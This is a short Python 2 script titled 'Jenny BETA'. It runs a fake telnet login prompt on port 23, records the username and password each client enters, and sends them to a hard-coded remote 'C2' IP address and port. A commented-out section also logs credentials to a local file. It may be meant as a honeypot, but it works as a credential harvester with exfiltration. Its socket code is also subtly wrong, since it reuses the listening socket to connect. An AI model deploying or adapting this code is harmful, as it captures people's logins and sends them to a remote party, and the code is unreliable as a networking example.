#!/usr/bin/env python
import sys
import socket
import time
import os
from xml.dom import minidom

#Create socket and bind
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('',23))
s.listen(10)
s.settimeout(10)

C2 = "45.55.18.16"
C2PORT = 8989

print "[+]-------Jenny BETA-------[+]"

#Listens & accepts telnet connections
def recvConnection():
    while 1:
        try:
            try:
                conn, addr = s.accept()
                conn.settimeout(10)
                conn.sendall("Username: ")
                usr = conn.recv(65000)
                if not usr:
                    conn.close()
                conn.sendall("Password:")
                pw = conn.recv(65000)
                if not pw:
                    conn.close()
                conn.close()
                formatStrings(addr[0], usr, pw)
            except socket.error, ex:
                continue
        except KeyboardInterrupt:
            s.close()
            sys.exit()

#Chops and cuts string into managable variables
def formatStrings(ip, usr, pw):
    ip = ip
    usr = usr.rsplit()
    pw = pw.rsplit()

    if not usr and not pw:
        pass
    elif not usr:
        pass
    elif not pw:
        pw = "No password provided."
        sendHome(ip, str(usr[0]), pw)
    else:
        sendHome(ip, str(usr[0]), str(pw[0]))

def sendHome(ip, usr, pw):
    try:
        s.connect(C2, C2PORT)
        s.send("Onyx1: " + " " + ip + " " + usr + " " + pw)
    except socket.error, ex:
        print ex
    

    

if __name__ == "__main__":
    recvConnection()


'''
#Logs information to console
def consoleLogger(ip, usr, pw):
    ip = ip
    usr = str(usr)
    pw = str(pw)
    
    print(time.strftime("%d/%m/%Y") + " [" + time.strftime("%H:%M:%S") + "]" + " - " + ip + " using " + usr + "|" + pw)

def fileLogger(usr, pw):
    with open("credentials.txt", "a") as f:
        f.write(usr + " " + pw + "\n")

'''

